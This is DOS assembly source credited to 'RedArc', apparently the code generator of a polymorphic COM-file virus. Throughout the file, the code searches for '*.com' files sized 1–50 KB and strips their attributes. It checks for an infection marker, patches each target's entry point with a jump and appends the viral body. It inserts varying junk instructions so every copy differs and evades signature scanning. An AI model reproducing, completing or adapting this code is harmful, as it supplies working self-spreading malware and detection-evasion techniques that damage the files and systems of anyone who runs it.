;(c) RedArc
_Generator:
       push ax
       push dx
       push cx
       cld
;mov di,si
       mov bx,0607h
       call _2_MOV16
;mov ax,MyOffs
       pop ax
       mov bl,0
       call _2_MOV16V16
;add ax,100h
       mov ax,100h
       mov bl,0
       call _2_ADD16V16
;mov si,ax
       mov bx,0006h
       call _2_MOV16
;mov bp,ax
       mov bx,0005h
       call _2_MOV16
;mov ax,word1
       mov ah,2fh
       int 21h
       sub bx,16
       mov si,bx
       mov ax,word ptr cs:[si]
       mov bl,0
       push si
       call RestoreBytesCase
;mov ax,word2
       pop si
       mov ax,word ptr cs:[si+2]
       mov bl,0
       call RestoreBytesCase
;mov di,si
       mov bx,0607h
       call _2_MOV16
       mov word ptr ds:[48],di
;add di,MyLength
       mov ax,1234h
       mov bl,7
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
;mov ax,'.*'
       mov ax,'.*'
       mov bl,0
       call _2_MOV16V16
       call _NOP
       call Stosw_Tabelle
       call _bl
       call _NOP
;mov ax,'oc'
       mov ax,'oc'
       mov bl,0
       call _2_MOV16V16
       call _NOP
       call Stosw_Tabelle
       call _bl
       call _NOP
;mov ax,0006dh
       mov ax,0006dh
       mov bl,0
       call _2_MOV16V16
       call _NOP
       call Stosw_Tabelle
       call _bl
       call _NOP
;mov ah,4ah
       mov ax,4a00h
       mov bl,0
       call _2_MOV16V16
;mov bx,8192
       mov ax,8192
       mov bl,3
       call _2_MOV16V16
;int 21h
       call _INT21h
;mov ax,1a00h
       mov ax,1a00h
       mov bl,0
       call _2_MOV16V16
       mov word ptr ds:[0],di
;mov dx,MyLength
       mov ax,1234h
       mov bl,2
       call Mov_Reg16_Value16_Tabelle
       call _al_bx
;add dx,16
       mov ax,16
       mov bl,2
       call _2_ADD16V16
;add dx,bp
       mov bx,0502h
       call _2_ADD16
;int 21h
       call _INT21h
;mov bp,si
       mov bx,0605h
       call _2_MOV16
;mov ax,4e00h
       mov ax,4e00h
       mov bl,0
       call _2_MOV16V16
;mov dx,bp
       mov bx,0502h
       call _2_MOV16
       mov word ptr ds:[50],di
;add dx,MyLength
       mov ax,1234h
       mov bl,2
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
;mov cx,0
       mov ax,0h
       mov bl,1
       call _2_MOV16V16
       mov word ptr ds:[2],di
;int 21h
       call _INT21h
       mov word ptr ds:[4],di
;jnb _TestFile
      mov bx,0d73h
      call _bx
;mov ax,1a00h
       mov ax,1a00h
       mov bl,0
       call _2_MOV16V16
;mov dx,80h
       mov ax,8000h
       mov bl,2
       call _2_MOV16V16
;int 21h
       call _INT21h
;mov ax,100h
       mov si,bp
       dec si
       mov bh,byte ptr cs:[si]
       cmp bh,0
       jne _@0@_
       mov ax,0
       jmp short _@1@_
_@0@_:
       mov ax,100h
_@1@_:
       mov bl,0
       call _2_MOV16V16
;push ax
       mov bx,0
       call Push_Reg16_Tabelle
       call _bl
;ret
       call _NOP
       mov al,0c3h
       mov byte ptr ds:[di],al
       inc di
       call _NOP
       mov word ptr ds:[6],di
;mov si,bp
       mov bx,0506h
       call _2_MOV16
       mov word ptr ds:[8],di
;add si,MyLength
       mov ax,1234h
       mov bl,6
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
;add si,1ah
       mov ax,1ah+16
       mov bl,6
       call _2_ADD16V16
;lodsw
       call _NOP
       call Lodsw_Tabelle
       call _bl
       call _NOP
;cmp ax,1024
       mov al,03dh
       mov byte ptr ds:[di],al
       inc di
       mov al,0
       mov byte ptr ds:[di],al
       inc di
       mov al,04h
       mov byte ptr ds:[di],al
       inc di
       mov word ptr ds:[10],di
;jnb _TF1
       mov bx,0573h
       call _bx
       mov word ptr ds:[12],di
;mov ax,4f00h
       mov ax,4f00h
       mov bl,0
       call _2_MOV16V16
       mov word ptr ds:[14],di
;jmp _Interrupt
       mov al,0e9h
       mov bx,1234h
       call _al_bx
       mov word ptr ds:[16],di
;cmp ax,1024*50
       mov al,03dh
       mov byte ptr ds:[di],al
       inc di
       mov al,0h
       mov byte ptr ds:[di],al
       inc di
       mov al,0c8h
       mov byte ptr ds:[di],al
       inc di
       mov word ptr ds:[18],di
;jb _OpenFile
       mov bx,0272h
       call _bx
       mov word ptr ds:[20],di
;jmp _TF0
       mov al,0e9h
       mov bx,1234h
       call _al_bx
       mov word ptr ds:[22],di
;mov ax,4301h
       mov ax,4301h
       mov bl,0
       call _2_MOV16V16
;mov dx,bp
       mov bx,0502h
       call _2_MOV16
       mov word ptr ds:[42],di
;add dx,MyLength
       mov ax,1234h
       mov bl,2
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
;add dx,1eh
       mov ax,1eh+16
       mov bl,2
       call _2_ADD16V16
;mov cx,0
       mov ax,0h
       mov bl,1
       call _2_MOV16V16
;int 21h
       call _INT21h
;mov ax,3d02h
       mov ax,3d02h
       mov bl,0
       call _2_MOV16V16
;mov dx,bp
       mov bx,0502h
       call _2_MOV16
       mov word ptr ds:[24],di
;add dx,MyLength
       mov ax,1234h
       mov bl,2
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
;add dx,1eh
       mov ax,1eh+16
       mov bl,2
       call _2_ADD16V16
;int 21h
       call _INT21h
;mov bx,ax
       mov bx,0003h
       call _2_MOV16
;mov ax,3f00h
       mov ax,3f00h
       mov bl,0
       call _2_MOV16V16
;mov dx,bp
       mov bx,0502h
       call _2_MOV16
       mov word ptr ds:[52],di
;add dx,MyLength
       mov ax,1234h
       mov bl,2
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
       call _NOP
;push dx
       mov bl,2
       call Push_Reg16_Tabelle
       call _bl
;mov cx,4
       mov ax,4h
       mov bl,1
       call _2_MOV16V16
;int 21h
       call _INT21h
;pop si
       mov bl,6
       call Pop_Reg16_Tabelle
       call _bl
       call _NOP
;add si,3
       mov ax,3
       mov bl,6
       call _2_ADD16V16
;lodsb
       call _NOP
       call Lodsb_Tabelle
       call _bl
       call _NOP
;cmp al,90h
       mov al,03ch
       mov byte ptr ds:[di],al
       inc di
       mov al,90h
       mov byte ptr ds:[di],al
       inc di
       mov word ptr ds:[26],di
;jne _TF2
       mov bx,1875h
       call _bx
       mov word ptr ds:[28],di
;mov ax,3e00h
       mov ax,3e00h
       mov bl,0
       call _2_MOV16V16
;int 21h
       call _INT21h
;mov ax,4301h
       mov ax,4301h
       mov bl,0
       call _2_MOV16V16
;mov dx,bp
       mov bx,0502h
       call _2_MOV16
       mov word ptr ds:[30],di
;add dx,MyLength
       mov ax,1234h
       mov bl,2
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
;add dx,1eh
       mov ax,1eh+16
       mov bl,2
       call _2_ADD16V16
;mov cx,1
       mov ax,1h
       mov bl,1
       call _2_MOV16V16
;int 21h
       call _INT21h
       mov word ptr ds:[32],di
;jmp _TF0
       mov al,0e9h
       mov bx,1234h
       call _al_bx
       mov word ptr ds:[34],di
;mov ax,4200h
       mov ax,4200h
       mov bl,0
       call _2_MOV16V16
;mov cx,0
       mov ax,0h
       mov bl,1
       call _2_MOV16V16
;mov dx,0
       mov ax,0h
       mov bl,2
       call _2_MOV16V16
;int 21h
       call _INT21h
;mov di,bp
       mov bx,0507h
       call _2_MOV16
       mov word ptr ds:[54],di
;add di,MyLength
       mov ax,1234h
       mov bl,7
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
;add di,4
       mov ax,4h
       mov bl,7
       call _2_ADD16V16
;mov ax,00e9h
       mov ax,00e9h
       mov bl,0
       call _2_MOV16V16
;stosb
       call _NOP
       call Stosb_Tabelle
       call _bl
       call _NOP
;mov si,bp
       mov bx,0506h
       call _2_MOV16
       mov word ptr ds:[36],di
;add si,MyLength
       mov ax,1234h
       mov bl,6
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
;add si,1ah
       mov ax,1ah+16
       mov bl,6
       call _2_ADD16V16
;lodsw
       call _NOP
       call Lodsw_Tabelle
       call _bl
       call _NOP
;stosw
       call _NOP
       call Stosw_Tabelle
       call _bl
       call _NOP
;mov al,90h
       mov bl,0
       mov bh,90h
       call Mov_Reg8_Value8_Tabelle
       call _bx
;stosb
       call _NOP
       call Stosb_Tabelle
       call _bl
       call _NOP
;mov ax,4000h
       mov ax,4000h
       mov bl,0
       call _2_MOV16V16
;mov dx,bp
       mov bx,0502h
       call _2_MOV16
       mov word ptr ds:[56],di
;add dx,MyLength
       mov ax,1234h
       mov bl,2
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
;add dx,4h
       mov ax,4h
       mov bl,2
       call _2_ADD16V16
;mov cx,4
       mov ax,4h
       mov bl,1
       call _2_MOV16V16
;int 21h
       call _INT21h
;mov ax,4202h
       mov ax,4202h
       mov bl,0
       call _2_MOV16V16
;mov cx,0
       mov ax,0h
       mov bl,1
       call _2_MOV16V16
;mov dx,0
       mov ax,0h
       mov bl,2
       call _2_MOV16V16
;int 21h
       call _INT21h
       mov word ptr ds:[44],di
;call _Manager
       mov al,0e8h
       mov byte ptr ds:[di],al
       inc di
       mov al,03h
       mov byte ptr ds:[di],al
       inc di
       mov al,0h
       mov byte ptr ds:[di],al
       inc di
       call _NOP
       mov word ptr ds:[38],di
;jmp _CloseFile
       mov al,0e9h
       mov bx,1234h
       call _al_bx
       call _NOP
       mov word ptr ds:[46],di
;SaveFile:
       mov si,bp
       dec si
       mov al,byte ptr cs:[si]
       cmp al,0
       jne _SaveBuffToFile
;mov ax,4000h
       mov ax,4000h
       mov bl,0
       call _2_MOV16V16
;mov dx,bp
       mov bx,0502h
       call _2_MOV16
;sub dx,3
       mov bl,2
       mov ax,3
       call _2_SUB16V16
       mov word ptr ds:[40],di
;mov cx,MyLength
       mov ax,1234h
       mov bl,1
       call Mov_Reg16_Value16_Tabelle
       call _al_bx
;add cx,3
       mov ax,3h
       mov bl,1
       call _2_ADD16V16
;int 21h
       call _INT21h
;ret
       mov al,0c3h
       mov byte ptr ds:[di],al
       inc di
       call _NOP
       jmp _SaveBuffToFile
_SaveBuffToFile:
;--- ReGenerator
       mov cx,di
       sub cx,100h
       mov es,cx
       mov al,byte ptr cs:[si]
       cmp al,0
       je _@_1
       add cx,_VCG_Length
_@_1:
;mov dx,MyLength
       mov di,word ptr ds:[0]
       mov word ptr ds:[di+1],cx
;mov cx,MyLength
       mov di,word ptr ds:[40]
       mov word ptr ds:[di+1],cx
;add si,MyLength
       mov di,word ptr ds:[8]
       mov word ptr ds:[di+2],cx
       mov di,word ptr ds:[36]
       mov word ptr ds:[di+2],cx
;add di,MyLength
       mov di,word ptr ds:[48]
       mov word ptr ds:[di+2],cx
       mov di,word ptr ds:[54]
       mov word ptr ds:[di+2],cx
;add dx,MyLength
       mov di,word ptr ds:[24]
       mov word ptr ds:[di+2],cx
       mov di,word ptr ds:[30]
       mov word ptr ds:[di+2],cx
       mov di,word ptr ds:[42]
       mov word ptr ds:[di+2],cx
       mov di,word ptr ds:[50]
       mov word ptr ds:[di+2],cx
       mov di,word ptr ds:[52]
       mov word ptr ds:[di+2],cx
       mov di,word ptr ds:[56]
       mov word ptr ds:[di+2],cx
;jmp _Interrupt
       push cx
       mov dx,word ptr ds:[2]
       mov ax,word ptr ds:[14]
       mov cx,0ffffh
       sub ax,dx
       sub cx,ax
       sub cx,2
       mov di,word ptr ds:[14]
       mov word ptr ds:[di+1],cx
       pop cx
;jnb _TestFile
       mov dx,word ptr ds:[4]
       mov ax,word ptr ds:[6]
       sub ax,dx
       sub ax,2
       mov di,word ptr ds:[4]
       mov byte ptr ds:[di+1],al
;jnb _TF1
       mov dx,word ptr ds:[10]
       mov ax,word ptr ds:[16]
       sub ax,dx
       sub ax,2
       mov di,word ptr ds:[10]
       mov byte ptr ds:[di+1],al
;jb _OpenFile
       mov dx,word ptr ds:[18]
       mov ax,word ptr ds:[22]
       sub ax,dx
       sub ax,2
       mov di,word ptr ds:[18]
       mov byte ptr ds:[di+1],al
;jmp _TF0
       push cx
       mov dx,word ptr ds:[12]
       mov ax,word ptr ds:[20]
       mov cx,0ffffh
       sub ax,dx
       sub cx,ax
       sub cx,2
       mov di,word ptr ds:[20]
       mov word ptr ds:[di+1],cx
       pop cx
;jne _TF2
       mov dx,word ptr ds:[26]
       mov ax,word ptr ds:[34]
       sub ax,dx
       sub ax,2
       mov di,word ptr ds:[26]
       mov byte ptr ds:[di+1],al
;jmp _TF0
       push cx
       mov dx,word ptr ds:[12]
       mov ax,word ptr ds:[32]
       mov cx,0ffffh
       sub ax,dx
       sub cx,ax
       sub cx,2
       mov di,word ptr ds:[32]
       mov word ptr ds:[di+1],cx
       pop cx
;jmp _CloseFile
       push cx
       mov dx,word ptr ds:[28]
       mov ax,word ptr ds:[38]
       mov cx,0ffffh
       sub ax,dx
       sub cx,ax
       sub cx,2
       mov di,word ptr ds:[38]
       mov word ptr ds:[di+1],cx
       pop cx
;call _Manager
       mov dx,word ptr ds:[44]
       mov ax,word ptr ds:[46]
       add dx,3
       sub ax,dx
       mov di,word ptr ds:[44]
       mov word ptr ds:[di+1],ax
;---
;--- WriteDate
       mov di,100h-3
       mov word ptr ds:[di],cx
       mov si,bp
       dec si
       mov al,byte ptr cs:[si]
       mov byte ptr ds:[di+2],al
_@1:
       pop bx
       push bx
       push cx
       mov ah,40h
       mov dx,100h-3
       mov cx,3
       int 21h
       pop cx
;--- WriteBuff
_@2:
       pop bx
       mov ah,40h
       mov dx,100h
       mov cx,es
       int 21h
       push cs
       pop es
       mov si,bp
       dec si
       mov al,byte ptr cs:[si]
       cmp al,0
       jne _@3
       pop ax
       ret
_@3:
       pop dx
       mov cx,_VCG_Length
       push ds
       push cs
       pop ds
       mov ah,40h
       int 21h
       pop ds
       ret
;---
RestoreBytesCase:
       mov si,bp
       dec si
       mov bh,byte ptr cs:[si]
       cmp bh,0
       je _@w1_1
       call _2_MOV16V16
       call _NOP
       call Stosw_Tabelle
       call _bl
       call _NOP
_@w1_1:
       ret
